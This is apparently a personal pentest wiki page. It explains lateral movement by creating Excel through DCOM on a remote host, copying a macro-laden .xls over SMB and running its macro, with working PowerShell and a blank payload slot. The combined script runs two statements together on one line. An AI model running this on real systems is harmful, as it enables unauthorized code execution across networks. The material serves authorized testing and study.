Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-11-03T15:44:29-05:00

====== Lateral Movement ======
Created Wednesday 03 November 2021

===== Exploiting Distribution Component Object Model =====
* This attack is carried out from the source machine, and attempts to execute code on the target machine.

==== Requirements ====
* Office must be installed on both the source and the target machine
* You must run the command as an admin of the target machine, on the source machine. So creds to the target machine are needed.
* The target machine must have port 445 (SMB) and 135(RPC) open


Step
{{{code: lang="powershell" linenumbers="True"
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "<target_ip>"))
$com | Get-Member
}}}

* This script will return all methods that can be executed on the target using excel.
* This will bork if you don't run the script as a local admin on the target
* Look for the "Run" method in the left column


Step
* On the source machine, create an excel file that contains a macro with your payload
* Open excel as the local user on the remote domain
{{{code: lang="vbnet" linenumbers="True"
Sub mymacro()
	<payload>
End Sub
}}}

* Save the file as excel '97-2003 (.xls) format
* Make sure it is saved in a location where the local admin on the target can access it

Step
* Copy the excel file to the target
* Since we have local admin on the target, we should be able to use SMB to get the file there
{{{code: lang="powershell" linenumbers="True"
$LocalPath = "<local_path_to_excel.xls>"
$RemotePath = "\\<ip>\<drive>$\<path_to_excel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
}}}


Step
* Create a subdir, because the command will fail if this subdir is not present
{{{code: lang="powershell" linenumbers="False"
$Path = "\\<ip>\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
}}}



All into one
{{{code: lang="powershell" linenumbers="True"
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
$com.Run("mymacro")

}}}


Step
* Execute this tidbit on the source host, and you'll execute code on the target host

===== SANANGO =====
* /platform/windows/rce/dcom
* /platform/windows/macros/create

===== SEE =====
[[Technologies:Portlist]]
[[Tools:Linux:MetaSploit:msfvenom]]
